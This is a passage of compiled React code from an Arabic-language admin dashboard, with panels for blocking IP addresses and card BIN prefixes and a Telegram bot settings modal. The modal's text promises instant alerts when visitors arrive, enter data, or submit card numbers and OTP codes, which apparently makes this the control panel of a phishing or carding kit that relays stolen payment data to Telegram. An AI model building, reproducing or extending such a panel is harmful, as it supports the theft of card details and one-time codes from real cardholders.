  }, "\u0644\u0627 \u062A\u0648\u062C\u062F \u0639\u0646\u0627\u0648\u064A\u0646 IP \u0645\u062D\u0638\u0648\u0631\u0629") : blockedIps.map(ip => /*#__PURE__*/React.createElement("span", {
    key: ip,
    className: "px-2 py-1 rounded-md bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-300 text-xs flex items-center gap-1"
  }, ip, /*#__PURE__*/React.createElement("button", {
    onClick: () => handleUnblockIp(ip),
    className: "font-bold hover:text-red-900"
  }, "\xD7"))))), /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-xl border border-gray-200 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("h4", {
    className: "font-bold text-sm mb-2 text-amber-500"
  }, "\u062D\u0638\u0631 \u0623\u0631\u0642\u0627\u0645 BIN (\u0623\u0648\u0644 6 \u0623\u0631\u0642\u0627\u0645 \u0644\u0644\u0628\u0637\u0627\u0642\u0629)"), /*#__PURE__*/React.createElement("div", {
    className: "flex gap-2 mb-3"
  }, /*#__PURE__*/React.createElement("input", {
    type: "text",
    placeholder: "\u0645\u062B\u0644\u0627\u064B: 411111 \u0623\u0648 529415",
    className: `flex-1 px-3 py-2 text-xs rounded-lg border ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200"}`,
    value: newBin,
    onChange: e => setNewBin(e.target.value)
  }), /*#__PURE__*/React.createElement("button", {
    onClick: handleBlockBin,
    className: "px-4 py-2 bg-amber-500 text-white text-xs font-bold rounded-lg hover:bg-amber-600"
  }, "\u062D\u0638\u0631 BIN")), /*#__PURE__*/React.createElement("div", {
    className: "flex flex-wrap gap-1.5 max-h-24 overflow-y-auto"
  }, blockedBins.length === 0 ? /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-gray-400"
  }, "\u0644\u0627 \u062A\u0648\u062C\u062F \u0623\u0631\u0642\u0627\u0645 BIN \u0645\u062D\u0638\u0648\u0631\u0629") : blockedBins.map(bin => /*#__PURE__*/React.createElement("span", {
    key: bin,
    className: "px-2 py-1 rounded-md bg-amber-100 dark:bg-amber-900/30 text-amber-700 dark:text-amber-300 text-xs flex items-center gap-1"
  }, bin, /*#__PURE__*/React.createElement("button", {
    onClick: () => handleUnblockBin(bin),
    className: "font-bold hover:text-amber-900"
  }, "\xD7")))))), /*#__PURE__*/React.createElement("div", {
    className: "mt-4 pt-3 border-t border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowBlockedPanel(false),
    className: "w-full py-2.5 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 font-bold rounded-xl text-xs"
  }, "\u0625\u063A\u0644\u0627\u0642")))), showTelegramModal && /*#__PURE__*/React.createElement("div", {
    className: "fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: `w-full max-w-lg p-6 rounded-2xl shadow-2xl ${isDark ? "bg-gray-800 text-white" : "bg-white text-gray-900"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between pb-3 border-b border-gray-100 dark:border-gray-700 mb-4"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xl"
  }, "\u2708\uFE0F"), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-base"
  }, "\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0627\u0644\u062A\u0644\u062C\u0631\u0627\u0645"), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400"
  }, "\u0627\u0633\u062A\u0644\u0627\u0645 \u062A\u0646\u0628\u064A\u0647\u0627\u062A \u0641\u0648\u0631\u064A\u0629 \u0639\u0646\u062F \u062F\u062E\u0648\u0644 \u0632\u0648\u0627\u0631\u060C \u0625\u062F\u062E\u0627\u0644 \u0628\u064A\u0627\u0646\u0627\u062A\u060C \u0623\u0648 \u0628\u0637\u0627\u0642\u0627\u062A \u0648\u0631\u0645\u0648\u0632 OTP"))), /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowTelegramModal(false),
    className: "p-1 rounded-lg text-gray-400 hover:text-gray-600 dark:hover:text-gray-200"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M6 18L18 6M6 6l12 12"
  })))), /*#__PURE__*/React.createElement("div", {
    className: "space-y-4"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("label", {
    className: "text-xs font-bold block mb-1"
  }, "Bot Token (\u062A\u0648\u0643\u0646 \u0627\u0644\u0628\u0648\u062A \u0645\u0646 BotFather):"), /*#__PURE__*/React.createElement("input", {
    type: "text",
    dir: "ltr",
    placeholder: "\u0645\u062B\u0627\u0644: 123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ",
    className: `w-full px-3 py-2 text-xs font-mono rounded-lg border ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200"}`,
    value: tgToken,
    onChange: e => setTgToken(e.target.value)
  })), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("label", {
    className: "text-xs font-bold block mb-1"
  }, "Chat ID (\u0645\u0639\u0631\u0641 \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0629 \u0623\u0648 \u0627\u0644\u0642\u0646\u0627\u0629):"), /*#__PURE__*/React.createElement("input", {
    type: "text",
    dir: "ltr",
    placeholder: "\u0645\u062B\u0627\u0644: 123456789 \u0623\u0648 -100123456789",
    className: `w-full px-3 py-2 text-xs font-mono rounded-lg border ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200"}`,
    value: tgChatId,
    onChange: e => setTgChatId(e.target.value)
  })), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3 p-3 rounded-xl bg-gray-50 dark:bg-gray-700/50"
  }, /*#__PURE__*/React.createElement("input", {
    type: "checkbox",
    id: "tg-enabled-cb",
    checked: tgEnabled,
    onChange: e => setTgEnabled(e.target.checked),
    className: "w-4 h-4 rounded text-blue-600 focus:ring-blue-500 cursor-pointer"
  }), /*#__PURE__*/React.createElement("label", {
    htmlFor: "tg-enabled-cb",
    className: "text-xs font-bold cursor-pointer"
  }, "\u062A\u0641\u0639\u064A\u0644 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0625\u0644\u0649 \u0627\u0644\u062A\u0644\u062C\u0631\u0627\u0645 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B")), tgStatusMsg && /*#__PURE__*/React.createElement("div", {
    className: `p-3 rounded-xl text-xs font-bold ${tgStatusMsg.success ? "bg-emerald-50 text-emerald-700 dark:bg-emerald-950/40 dark:text-emerald-400 border border-emerald-200 dark:border-emerald-800" : "bg-red-50 text-red-700 dark:bg-red-950/40 dark:text-red-400 border border-red-200 dark:border-red-800"}`
  }, tgStatusMsg.text)), /*#__PURE__*/React.createElement("div", {
    className: "mt-6 pt-3 border-t border-gray-100 dark:border-gray-700 flex items-center justify-between gap-2"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex gap-2"
  }, /*#__PURE__*/React.createElement("button", {
    disabled: tgLoading,
    onClick: async () => {
      setTgLoading(true);
      setTgStatusMsg(null);
      try {
        await adminApi.saveTelegramConfig({
          token: tgToken.trim(),
          chatId: tgChatId.trim(),
          enabled: tgEnabled
        });
        setTgStatusMsg({
          success: true,
          text: "✓ تم حفظ إعدادات التلجرام بنجاح!"
        });
      } catch (e) {
        setTgStatusMsg({
          success: false,
          text: "فشل حفظ الإعدادات"
        });
      }
      setTgLoading(false);
    },
    className: "px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl text-xs cursor-pointer disabled:opacity-50"
  }, tgLoading ? "جاري الحفظ..." : "حفظ الإعدادات"), /*#__PURE__*/React.createElement("button", {
    disabled: tgLoading,
    onClick: async () => {
      setTgLoading(true);
      setTgStatusMsg(null);
      try {
        await adminApi.saveTelegramConfig({
          token: tgToken.trim(),
          chatId: tgChatId.trim(),
          enabled: tgEnabled
        });
        const res = await adminApi.testTelegram();
        if (res.success) {
          setTgStatusMsg({
            success: true,
            text: "✓ تم إرسال رسالة تجريبية بنجاح إلى التلجرام!"
          });
        } else {
          setTgStatusMsg({
            success: false,
            text: "فشل الإرسال: " + (res.error || "تأكد من صحة التوكن وChat ID")
          });
        }
      } catch (e) {
        setTgStatusMsg({
          success: false,
          text: "فشل إرسال التجربة"
        });
      }
      setTgLoading(false);
    },
    className: "px-4 py-2 bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-700 dark:text-gray-200 font-bold rounded-xl text-xs cursor-pointer disabled:opacity-50"
  }, "\u0625\u0631\u0633\u0627\u0644 \u062A\u062C\u0631\u0628\u0629 \u2708\uFE0F")), /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowTelegramModal(false),
    className: "px-3 py-2 text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 text-xs font-bold rounded-xl cursor-pointer"
  }, "\u0625\u063A\u0644\u0627\u0642")))));
}
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      hasError: false,
      error: null
    };
  }
  static getDerivedStateFromError(error) {
    return {
      hasError: true,
      error
    };
  }
  componentDidCatch(error, errorInfo) {
    console.error("Dashboard error caught by boundary:", error, errorInfo);
  }
  render() {
    if (this.state.hasError) {
      return /*#__PURE__*/React.createElement("div", {
        className: "min-h-screen flex flex-col items-center justify-center p-6 text-center bg-gray-50 dark:bg-gray-900 text-gray-800 dark:text-gray-100",
        dir: "rtl"
      }, /*#__PURE__*/React.createElement("div", {
        className: "w-16 h-16 bg-amber-100 dark:bg-amber-900/40 rounded-full flex items-center justify-center mb-4 text-amber-600 dark:text-amber-400 text-2xl font-bold"
      }, "\u26A0\uFE0F"), /*#__PURE__*/React.createElement("h2", {
        className: "text-xl font-bold mb-2"
      }, "\u0644\u0648\u062D\u0629 \u0627\u0644\u062A\u062D\u0643\u0645 \u0646\u0634\u0637\u0629"), /*#__PURE__*/React.createElement("p", {
        className: "text-sm text-gray-500 dark:text-gray-400 max-w-md mb-6"
      }, "\u062A\u0645 \u0627\u0644\u062A\u0642\u0627\u0637 \u062A\u0646\u0628\u064A\u0647\u060C \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u0646\u0642\u0631 \u0644\u0625\u0639\u0627\u062F\u0629 \u062A\u062D\u0645\u064A\u0644 \u0627\u0644\u0644\u0648\u062D\u0629 \u0648\u0627\u0644\u0627\u062A\u0635\u0627\u0644 \u0627\u0644\u0641\u0648\u0631\u064A \u0628\u0642\u0627\u0639\u062F\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A."), /*#__PURE__*/React.createElement("button", {
        onClick: () => {
          try {
            localStorage.removeItem('_cr7_visitors');
          } catch (e) {}
          window.location.reload();
        },
        className: "px-6 py-2.5 bg-blue-600 text-white font-bold rounded-xl shadow hover:bg-blue-700 transition-all cursor-pointer"
      }, "\uD83D\uDD04 \u0625\u0639\u0627\u062F\u0629 \u062A\u062D\u0645\u064A\u0644 \u0627\u0644\u0644\u0648\u062D\u0629 \u0627\u0644\u0622\u0646"));
    }
    return this.props.children;
  }
}
ReactDOM.createRoot(document.getElementById('root')).render(/*#__PURE__*/React.createElement(ErrorBoundary, null, /*#__PURE__*/React.createElement(Dashboard, null)));